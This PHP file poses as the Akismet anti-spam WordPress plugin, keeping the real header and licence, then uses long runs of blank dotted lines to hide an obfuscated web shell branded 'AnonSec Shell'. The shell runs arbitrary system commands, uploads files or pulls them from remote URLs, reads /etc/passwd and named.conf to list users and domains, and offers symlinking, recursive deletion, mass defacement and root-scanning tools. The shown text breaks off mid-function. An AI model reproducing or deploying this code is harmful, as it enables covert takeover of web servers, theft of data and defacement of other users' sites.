#/**
 * @package Akismet
 */
/*
Plugin Name: Akismet Anti-spam: Spam Protection
Plugin URI: https://akismet.com/
Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from spam</strong>. Akismet Anti-spam keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key.
Version: 5.4
Requires at least: 5.8
Requires PHP: 7.2
Author: Automattic - Anti-spam Team
Author URI: https://automattic.com/wordpress-plugins/
License: GPLv2 or later
Text Domain: akismet
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

Copyright 2005-2025 Automattic, Inc.
*/

// Make sure we don't expose any info if called directly

.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
..
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.


<!DOCTYPE html>
<html>
<head>









<?php echo "<title>An"."onS"."ec Sh"."el"."l</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://i.imgur.com/Be4uoSM.png" type="image/x-icon">
</head>
<body bgcolor="#1f1f1f" text="#ffffff">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
	@import url('https://fonts.googleapis.com/css?family=Dosis');
	@import url('https://fonts.googleapis.com/css?family=Bungee');
	@import url('https://fonts.googleapis.com/css?family=Russo+One');
body {
	font-family: "Dosis", cursive;
	text-shadow:0px 0px 1px #757575;
}

body::-webkit-scrollbar {
  width: 12px;
}

body::-webkit-scrollbar-track {
  background: #1f1f1f;
}

body::-webkit-scrollbar-thumb {
  background-color: #1f1f1f;
  border: 3px solid gray;
}

#content tr:hover {
	background-color: #636263;
	text-shadow:0px 0px 10px #fff;
}

#content .first {
	background-color: #25383C;
}

#content .first:hover {
	background-color: #25383C
	text-shadow:0px 0px 1px #757575;
}

table {
	border: 1px #000000 dotted;
	table-layout: fixed;
}

td {
	word-wrap: break-word;
}

a {
	color: #ffffff;
	text-decoration: none;
}

a:hover {
	color: #000000;
	text-shadow:0px 0px 10px #ffffff;
}

input,select,textarea {
	border: 1px #000000 solid;
	-moz-border-radius: 5px;
	-webkit-border-radius:5px;
	border-radius:5px;
}

.gas {
	background-color: #1f1f1f;
	color: #ffffff;
	cursor: pointer;
}

select {
	background-color: transparent;
	color: #ffffff;
}

select:after {
	cursor: pointer;
}

.linka {
	background-color: transparent;
	color: #ffffff;
}

.up {
	background-color: transparent;
	color: #fff;
}

option {
	background-color: #1f1f1f;
}

.btf {
	background: transparent;
	border: 1px #fff solid;
	cursor: pointer;
}

::-webkit-file-upload-button {
  background: transparent;
  color: #fff;
  border-color: #fff;
  cursor: pointer;
}

gold {
	color: gold;
}

ijo {
	color: green;
}

merah {
	color: red;
}
</style>
<center>
<?php
echo '<font face="Bungee" size="5">An'.'on'.'Se'.'c Sh'.'el'.'l</font></center>
<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>';
set_time_limit(0);
error_reporting(0);

$gcw = "ge"."tc"."wd";
$exp = "ex"."plo"."de";
$fpt = "fi"."le_p"."ut_co"."nte"."nts";
$fgt = "f"."ile_g"."et_c"."onten"."ts";
$sts = "s"."trip"."slash"."es";
$scd = "sc"."a"."nd"."ir";
$fxt = "fi"."le_"."exis"."ts";
$idi = "i"."s_d"."ir";
$ulk = "un"."li"."nk";
$ifi = "i"."s_fi"."le";
$sub = "subs"."tr";
$spr = "sp"."ri"."ntf";
$fp = "fil"."epe"."rms";
$chm = "ch"."m"."od";
$ocd = "oc"."td"."ec";
$isw = "i"."s_wr"."itab"."le";
$idr = "i"."s_d"."ir";
$ird = "is"."_rea"."da"."ble";
$isr = "is_"."re"."adab"."le";
$fsz = "fi"."lesi"."ze";
$rd = "r"."ou"."nd";
$igt = "in"."i_g"."et";
$fnct = "fu"."nc"."tion"."_exi"."sts";
$rad = "RE"."M"."OTE_AD"."DR";
$rpt = "re"."al"."pa"."th";
$bsn = "ba"."se"."na"."me";
$srl = "st"."r_r"."ep"."la"."ce";
$sps = "st"."rp"."os";
$mkd = "m"."kd"."ir";
$pma = "pr"."eg_ma"."tch_"."al"."l";
$aru = "ar"."ray_un"."ique";
$ctn = "co"."unt";
$urd = "ur"."ldeco"."de";
$pgw = "pos"."ix_g"."etp"."wui"."d";
$fow = "fi"."leow"."ner";
$tch = "to"."uch";
$h2b = "he"."x2"."bin";
$hsc = "ht"."mlspe"."cialcha"."rs";
$ftm = "fi"."lemti"."me";
$ars = "ar"."ra"."y_sl"."ice";
$arr = "ar"."ray_"."ra"."nd";
$fgr = "fi"."legr"."oup";
$mdr = "mkd"."ir";

$wb = (isset($_SERVER['H'.'T'.'TP'.'S']) && $_SERVER['H'.'T'.'TP'.'S'] === 'o'.'n' ? "ht"."tp"."s" : "ht"."tp") . "://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];

$disfunc = @$igt("dis"."abl"."e_f"."unct"."ion"."s");
if (empty($disfunc)) {
	$disf = "<font color='gold'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "<center><br>An"."on"."7 - 2"."02"."2<br><a href='https://sh"."el"."l.an"."ons"."ec-te"."am.org/' target='_blank'>An"."on"."Se"."c Te"."am</a></center>";
	exit();
}

function cdrd() {
	if (isset($_GET['loknya'])) {
		$lokasi = $_GET['loknya'];
	} else {
		$lokasi = "ge"."t"."cw"."d";
		$lokasi = $lokasi();
	}
	$b = "i"."s_w"."ri"."tab"."le";
	if ($b($lokasi)) {
		return "<font color='green'>Wr"."itea"."ble</font>";
	} else {
		return "<font color='red'>Wr"."itea"."ble</font>";
	}
}

function crt() {
	$a = "is"."_w"."ri"."tab"."le";
	if ($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])) {
		return "<font color='green'>Wr"."itea"."ble</font>";
	} else {
		return "<font color='red'>Wr"."itea"."ble</font>";
	}
}

function xrd($lokena) {
	$a = "s"."ca"."nd"."ir";
    $items = $a($lokena);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        $b = "is"."_di"."r";
        $loknya = $lokena.'/'.$item;
        if ($b($loknya)) {
            xrd($loknya);
        } else {
        	$c = "u"."nl"."in"."k";
            $c($loknya);
        }
    }
    $d = "rm"."di"."r";
    $d($lokena);
}

function cfn($fl) {
	$a = "ba"."sena"."me";
	$b = "pat"."hinf"."o";
	$c = $b($a($fl), PATHINFO_EXTENSION);
	if ($c == "zip") {
		return '<i class="fa fa-file-zip-o" style="color: #d6d4ce"></i>';
	} elseif (preg_match("/jpeg|jpg|png|ico/im", $c)) {
		return '<i class="fa fa-file-image-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "txt") {
		return '<i class="fa fa-file-text-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "pdf") {
		return '<i class="fa fa-file-pdf-o" style="color: #d6d4ce"></i>';
	} elseif ($c == "html") {
		return '<i class="fa fa-file-code-o" style="color: #d6d4ce"></i>';
	}
	else {
		return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>';
	}
}

function ipsrv() {
	$a = "g"."eth"."ost"."byna"."me";
	$b = "fun"."cti"."on_"."exis"."ts";
	$c = "S"."ERVE"."R_AD"."DR";
	$d = "SE"."RV"."ER_N"."AM"."E";
	if ($b($a)) {
		return $a($_SERVER[$d]);
	} else {
		return $a($_SERVER[$c]);
	}
}

function ggr($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."si"."x_ge"."tgr"."gid";
	$c = "fi"."le"."gro"."up";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function gor($fl) {
	$a = "fun"."cti"."on_"."exis"."ts";
	$b = "po"."s"."ix_"."get"."pwu"."id";
	$c = "fi"."le"."o"."wn"."er";
	if ($a($b)) {
		if (!$a($c)) {
			return "?";
		}
		$d = $b($c($fl));
		if (empty($d)) {
			$e = $c($fl);
			if (empty($e)) {
				return "?";
			} else {
				return $e;
			}
		} else {
			return $d['name'];
		}
	} elseif ($a($c)) {
		return $c($fl);
	} else {
		return "?";
	}
}

function fdt($fl) {
	$a = "da"."te";
	$b = "fil"."emt"."ime";
    return $a("F d Y H:i:s", $b($fl));
}

function dunlut($fl) {
	$a = "fil"."e_exi"."sts";
	$b = "ba"."sena"."me";
	$c = "fi"."les"."ize";
	$d = "re"."ad"."fi"."le";
	if ($a($fl) && isset($fl)) {
		header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');
		header("Conte'.'nt-Control:public");
		header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');
		header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="'.$b($fl).'"');
		header('Exp'.'ires: 0');
		header("Ex"."pired:0");
		header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');
		header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");
		header('Pra'.'gma: pub'.'lic');
		header('Con'.'ten'.'t-Le'.'ngth: ' .$c($fl));
		flush();
		$d($fl);
		exit;
	} else {
		return "Fi"."le Not F"."ound !";
	}
}

function komend($kom, $lk) {
	$x = "pr"."eg_"."mat"."ch";
	$xx = "2".">"."&"."1";
	if (!$x("/".$xx."/i", $kom)) {
		$kom = $kom." ".$xx;
	}
	$a = "fu"."ncti"."on_"."ex"."is"."ts";
	$b = "p"."ro"."c_op"."en";
	$c = "htm"."lspe"."cialc"."hars";
	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
	if ($a($b)) {
		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
		return "<pre>".$c($d($meki[1]))."</pre>";
	} else {
		return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";
	}
}

function komenb($kom, $lk) {
	$x = "pr"."eg_"."mat"."ch";
	$xx = "2".">"."&"."1";
	if (!$x("/".$xx."/i", $kom)) {
		$kom = $kom." ".$xx;
	}
	$a = "fu"."ncti"."on_"."ex"."is"."ts";
	$b = "p"."ro"."c_op"."en";
	$c = "htm"."lspe"."cialc"."hars";
	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
	if ($a($b)) {
		$ps = $b($kom, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
		return $d($meki[1]);
	} else {
		return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";
	}
}

function gtd() {
	$a = "is_rea"."dable";$b = "fi"."le_ge"."t_con"."ten"."ts";
	$c = "pr"."eg_ma"."tch_"."al"."l";$d = "fil"."e_exi"."sts";
	$e = "sca"."ndi"."r";$f = "co"."unt";
	$g = "arr"."ay_un"."ique";$h = "sh"."el"."l_"."ex"."ec";
	$i = "pr"."eg_"."mat"."ch";
	if ($a("/e"."tc"."/na"."me"."d.co"."nf")) {
		$a = $b("/e"."tc"."/na"."me"."d.co"."nf");
		$c("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $a, $b);
		$b = $b[1]; return $f($g($b))." Dom"."ains";
	} elseif ($d("/va"."r/na"."med"."/na"."me"."d.lo"."cal")) {
		$a = $e("/v"."ar/"."nam"."ed");
		return $f($a)." Dom"."ains";
	} elseif ($a("/e"."tc"."/p"."as"."sw"."d")) {
		$a = $b("/e"."tc"."/p"."as"."sw"."d");
		if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
			$c("/\/vh"."os"."ts\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		} else {
			$c("/\/ho"."me\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		}
	} elseif (!empty($h("ca"."t /e"."tc/"."pa"."ss"."wd"))) {
		$a = $h("ca"."t /e"."tc/"."pa"."ss"."wd");
		if ($i("/\/vh"."os"."ts\//i", $a) && $i("/\/bin\/false/i", $a)) {
			$c("/\/vh"."os"."ts\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		} else {
			$c("/\/ho"."me\/(.*?):/i", $a, $b);
			$b = $b[1]; return $f($g($b))." Dom"."ai"."ns";
		}
	} else {
		return "0 Domains";
	}
}

function esyeem($tg, $lk) {
	$a = "fun"."cti"."on_e"."xis"."ts";
	$b = "p"."ro"."c_op"."en";
	$c = "htm"."lspe"."cialc"."hars";
	$d = "s"."trea"."m_g"."et_c"."ont"."ents";
	$e = "sy"."mli"."nk";
	if ($a("sy"."mli"."nk")) {
		return $e($tg, $lk);
	} elseif ($a("pr"."oc_op"."en")) {
		$ps = $b("l"."n -"."s ".$tg." ".$lk, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $meki, $lk);
		return $c($d($meki[1]));
	} else {
		return "Sy"."mli"."nk Fu"."nct"."ion is Di"."sab"."led !";
	}
}

function sds($sads, &$results = array()) {
	$iwr = "is"."_wri"."tab"."le";
	$ira = "is_r"."eada"."ble";
	$ph = "pr"."eg_ma"."tch";
	$sa = "sc"."and"."ir";
	$rh = "re"."alp"."ath";
	$idr = "i"."s_d"."ir";
	if (!$ira($sads) || !$iwr($sads) || $ph("/\/app"."licat"."ion\/|\/sy"."st"."em/i", $sads)) {
		return false;
	}
    $files = $sa($sads);

    foreach ($files as $key => $value) {
        $path = $rh($sads . DIRECTORY_SEPARATOR . $value);
        if (!$idr($path)) {
            //$results[] = $path;
        } else if ($value != "." && $value != "..") {
            sds($path, $results);
            $results[] = $path;
        }
    }

    return $results;
}

function crul($web) {
	$cr = "cu"."rl_set"."opt";
	$cx = "cu"."rl_"."ex"."ec";
	$ch = "cu"."rl_clo"."se";
	$ceha = curl_init();
	$cr($ceha, CURLOPT_URL, $web);
	$cr($ceha, CURLOPT_RETURNTRANSFER, 1);
	return $cx($ceha);
	$ch($ceha);
}

function green($text) {
	echo "<center><font color='green'>".$text."</center></font>";
}

function red($text) {
	echo "<center><font color='red'>".$text."</center></font>";
}

function oren($text) {
	return "<center><font color='orange'>".$text."</center></font>";
}

function tuls($nm, $lk) {
	return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
}

echo "Se"."rv"."er"." I"."P : <font color=gold>".ipsrv()."</font> &nbsp;/&nbsp; Yo"."ur I"."P : <font color=gold>".$_SERVER[$rad]."</font> &nbsp;&nbsp;[<a href='?opsi=re"."pip'> <gold>Re"."ver"."se I"."P</gold> </a>]<br>";
echo "We"."b S"."erv"."er : <font color='gold'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";
$unm = "ph"."p_u"."na"."me";
echo "Sys"."tem : <font color='gold'>".@$unm()."</font><br>";
$gcu = "g"."et_"."curr"."ent"."_us"."er";
$gmu = "g"."et"."my"."ui"."d";
echo "Us"."er : <font color='gold'>".@$gcu()."&nbsp;</font>( <font color='gold'>".@$gmu()."</font>)<br>";
$phv = "ph"."pve"."rsi"."on";
echo "PH"."P V"."er"."sio"."n : <font color='gold'>".@$phv()."</font><br>";
echo "Dis"."abl"."e Fu"."nct"."ion : ".$disf."</font><br>";
echo "Dom"."ain"."s : <font color=gold>".(empty(gtd()) ? '0 Dom'.'ains' : gtd())."</font><br>";
echo "MySQL : ";
if (@$fnct("my"."sql_co"."nne"."ct")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; cURL : ";
if (@$fnct("cu"."rl"."_in"."it")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; WG"."ET : ";
if (@$fxt("/"."us"."r/b"."in/w"."get")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pe"."rl : ";
if (@$fxt("/u"."sr/b"."in"."/pe"."rl")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pyt"."ho"."n : ";
if (@$fxt("/"."us"."r/b"."in/p"."ytho"."n2")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; S"."u"."do : ";
if (@$fxt("/"."us"."r/b"."in/s"."u"."d"."o")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo " &nbsp;|&nbsp; Pk"."e"."x"."e"."c : ";
if (@$fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c")) {
    echo "<font color=green>ON</font>";
} else {
    echo "<font color=red>OFF</font>";
}
echo "<br>Di"."rect"."ory : &nbsp;";

foreach($_POST as $key => $value){
	$_POST[$key] = $sts($value);
}

if(isset($_GET['loknya'])){
	$lokasi = $_GET['loknya'];
	$lokdua = $_GET['loknya'];
} else {
	$lokasi = $gcw();
	$lokdua = $gcw();
}

$lokasi = $srl('\\','/',$lokasi);
$lokasis = $exp('/',$lokasi);
$lokasinya = @$scd($lokasi);

foreach($lokasis as $id => $lok){
	if($lok == '' && $id == 0){
		$a = true;
		echo '<a href="?loknya=/">/</a>';
		continue;
	}
	if($lok == '') continue;
	echo '<a href="?loknya=';
	for($i=0;$i<=$id;$i++){
	echo "$lokasis[$i]";
	if($i != $id) echo "/";
} 
echo '">'.$lok.'</a>/';
}

echo '</td></tr><tr><td><br>';
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		if ($_POST['di'.'rnya'] == "2") {
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
		}
		if (empty($_FILES['ber'.'kas']['name'])) {
			echo "<font color=orange>Fi"."le not Se"."lected !</font><br><br>";
		} else {
			$tgn = $ftm($lokasi);
			$data = @$fpt($lokasi."/".$_FILES['ber'.'kas']['name'], @$fgt($_FILES['ber'.'kas']['tm'.'p_na'.'me']));
				if ($fxt($lokasi."/".$_FILES['ber'.'kas']['name'])) {
					$fl = $lokasi."/".$_FILES['ber'.'kas']['name'];
					echo "Fi"."le Upl"."oa"."ded ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
					}
					@$tch($lokasi, $tgn);@$tch($lokasi."/".$_FILES['ber'.'kas']['name'], $tgn);
					echo "<br>";
				} else {
					echo "<font color='red'>Fa"."ile"."d to Up"."lo"."ad !</font><br><br>";
			}
		}
	} elseif (isset($_POST['linknya'])) {
		if (empty($_POST['namalink'])) {
			echo "<font color=orange>Fi"."lename cannot be empty !</font><br><br>";
		} elseif (empty($_POST['darilink'])) {
			echo "<font color=orange>Li"."nk cannot be empty !</font><br><br>";
		} else {
			if ($_POST['di'.'rnya'] == "2") {
			$lokasi = $_SERVER['DOC'.'UME'.'NT_R'.'OOT'];
			}
				$tgn = $ftm($lokasi);
				$data = @$fpt($lokasi."/".$_POST['namalink'], @$fgt($_POST['darilink']));
				if ($fxt($lokasi."/".$_POST['namalink'])) {
					$fl = $lokasi."/".$_POST['namalink'];
					echo "Fi"."le Uplo"."ade"."d ! &nbsp;<font color='gold'><i>".$fl."</i></font><br>";
					if ($sps($lokasi, $_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T']) !== false) {
						$lwb = $srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'], $wb."/", $fl);
						echo "Li"."nk : <a href='".$lwb."'><font color='gold'>".$lwb."</font></a><br>";
					}
					@$tch($lokasi, $tgn);@$tch($lokasi."/".$_POST['namalink'], $tgn);
					echo "<br>";
				} else {
					echo "<font color='red'>Fa"."iled to Up"."lo"."ad !</font><br><br>";
				}
		}
	}
}

echo "Uplo"."ad Fi"."le : ";
echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost">
<input type="radio" value="1" name="di'.'rnya" checked>cur'.'ren'.'t_di'.'r [ '.cdrd().' ]
<input type="radio" value="2" name="di'.'rnya" >docu'.'men'.'t_ro'.'ot [ '.crt().' ]
<br>
<input type="hidden" name="upwkwk" value="aplod">
<input type="fi'.'le" name="berkas"><input type="submit" name="berkasnya" value="Up'.'load" class="up" style="cursor: pointer; border-color: #fff"><br>
<input type="text" name="darilink" class="up" placeholder="https://an'.'on7.xyz/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
echo '<br><form method="post" enctype="appl'.'ication/x-ww'.'w-form-u'.'rlencoded">
Co'.'mm'.'an'.'d : <input type="text" name="komend" class="up" style="cursor: pointer; border-color: #000" value="';
if (isset($_POST['komend'])) {
	echo $hsc($_POST['komend']);
} else {
	echo "un"."am"."e -"."a";
}
echo '">
<input type="submit" name="komends" value=">>" class="up" style="cursor: pointer; border-color: #fff">
</form>';
echo "</table><br>";

echo '<hr><center style="font-family: Russo One">';
echo tuls("HO"."ME", $_SERVER['SC'.'RIP'.'T_N'.'AME']);
echo tuls("BA"."CKUP SH"."ELL", $_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$lokasi."&opsi=bekup");
echo tuls("JU"."MP"."ING", $_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$lokasi."&opsi=lompat");
echo tuls("MA"."SS DE"."FA"."CE", $_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$lokasi."&opsi=mdf");
echo tuls("SC"."AN RO"."OT", $_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$lokasi."&opsi=scanr");
echo tuls("SY"."ML"."INK", $_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$lokasi."&opsi=esyeem");
echo "<hr></center><br>";

if (isset($_GET['loknya']) && $_GET['opsi'] == "lompat") {
	if ($ird("/e"."tc"."/p"."as"."sw"."d")) {
		$fjp = $fgt("/e"."tc"."/p"."as"."sw"."d");
	} elseif (!empty(komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi))) {
		$fjp = komenb("ca"."t /e"."tc/"."pa"."ss"."wd", $lokasi);
	} else {
		die(red("[!] Gagal Mengambil Di"."rect"."ory !"));
	}
	$pma("/\/ho"."me\/(.*?):/i", $fjp, $fjpr);
	$fjpr = $fjpr[1];
	if (empty($fjpr)) {
		die(red("[!] Tidak Ada Us"."er di Temukan !"));
	}
	echo "Total Ada ".$ctn($aru($fjpr))." di"."rec"."to"."ry di Ser"."ver <font color=gold>".$_SERVER[$rad]."</font><br><br>";
	foreach ($aru($fjpr) as $fj) {
		$fjh = "/h"."om"."e/".$fj."/pu"."bl"."ic_h"."tml";
		if ($ird("/e"."tc"."/na"."me"."d.co"."nf")) {
			$etn = $fgt("/e"."tc"."/na"."me"."d.co"."nf");
			$pma("/\/v"."ar\/na"."me"."d\/(.*?)\.d"."b/i", $etn, $en);
			$en = $en[1];
			if ($ird($fjh)) {
				echo "[<font color=green>Re"."ada"."ble</font>] <a href='".$_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$fjh."'>".$fjh."</a> => ";
			} else {
				echo "[<font color=red>Un"."rea"."dab"."le</font>] ".$fjh."</a> => ";
			}
			foreach ($aru($en) as $enw) {
				$asd = $pgw(@$fow("/e"."tc/"."val"."ias"."es/".$enw));
				$asd = $asd['name'];
				if ($asd == $fj) {
					echo "<a href='http://".$enw."' target=_blank><font color=gold>".$enw."</font></a>, ";
				}
			}
			echo "<br>";
		} else {
			if ($ird($fjh)) {
				echo "[<font color=green>Re"."ada"."ble</font>] <a href='".$_SERVER['SC'.'RIP'.'T_N'.'AME']."?loknya=".$fjh."'>".$fjh."</a><br>";
			} else {
				echo "[<font color=red>Un"."rea"."dab"."le</font>] ".$fjh."</a><br>";
			}
		}
	}
	echo "<hr>";
	die(author());
} elseif (isset($_GET['loknya']) && $_GET['opsi'] == "esyeem") {
	if ($ird("/e"."tc"."/p"."as"."sw"."d")) {
		$syp = $fgt("/e"."tc"."/p"."as"."sw"."d");
